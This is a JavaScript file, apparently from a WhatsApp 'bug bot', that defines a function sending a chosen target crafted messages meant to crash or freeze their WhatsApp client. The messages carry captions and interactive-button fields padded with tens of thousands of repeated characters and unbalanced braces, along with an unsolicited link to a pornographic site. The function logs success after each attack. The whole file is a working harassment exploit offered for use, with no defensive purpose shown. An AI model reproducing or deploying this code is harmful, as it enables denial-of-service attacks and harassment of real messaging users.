const VaxzyXx = JSON.stringify({
  status: true,
  criador: "VerloadXApiBug",
  resultado: {
    type: "md",
    ws: {
      _events: {
        "CB:ib,,dirty": ["Array"]
      },
      _eventsCount: 800000,
      _maxListeners: 0,
      url: "wss://web.whatsapp.com/ws/chat",
      config: {
        version: ["Array"],
        browser: ["Array"],
        waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
        sockCectTimeoutMs: 20000,
        keepAliveIntervalMs: 30000,
        logger: {},
        printQRInTerminal: false,
        emitOwnEvents: true,
        defaultQueryTimeoutMs: 60000,
        customUploadHosts: [],
        retryRequestDelayMs: 250,
        maxMsgRetryCount: 5,
        fireInitQueries: true,
        auth: { Object: "authData" },
        markOnlineOnsockCect: true,
        syncFullHistory: true,
        linkPreviewImageThumbnailWidth: 192,
        transactionOpts: { Object: "transactionOptsData" },
        generateHighQualityLinkPreview: false,
        options: {},
        appStateMacVerification: { Object: "appStateMacData" },
        mobile: true
      }
    }
  }
});

async function XProtexImgXCall(target) {
    const imageUrl = "https://files.catbox.moe/qicp80.jpg"; 
    const image = "https://files.catbox.moe/qicp80.jpg";
    const linkUrl = "https://xnxxbokepjepang.com";
    const captionText = "ꦾ".repeat(20000) + "Hi I'm XProtex!!".repeat(20000);
    await sock.sendMessage(target, {
      image: { url: image },
       caption: captionText,
        contextInfo: {
          externalAdReply: {
          title: "",
          body: linkUrl,
          thumbnailUrl: imageUrl,
          sourceUrl: linkUrl,
          mediaType: 1
        }
      }
    });
  
  const msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            contextInfo: {
              expiration: 1,
              ephemeralSettingTimestamp: 1,
              entryPointConversionSource: "WhatsApp.com",
              entryPointConversionApp: "WhatsApp",
              entryPointConversionDelaySeconds: 1,
              disappearingMode: {
                initiatorDeviceJid: target,
                initiator: "INITIATED_BY_OTHER",
                trigger: "UNKNOWN_GROUPS"
              },
              participant: "0@s.whatsapp.net",
              remoteJid: "status@broadcast",
              mentionedJid: [target],
              questionMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: null
                }
              },
              externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: true
              }
            },
            body: {
              text: "Hi I'm XProtex!!" + "ោ៝".repeat(10000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(20000),
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: VaxzyXx + "{".repeat(20000),
                }
              ]
            }
          }
        }
      }
    },
    {}
  );
    
  await sock.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
  console.log(chalk.red(`Succes Sending Bug XProtexImgXCall To ${target}`));
}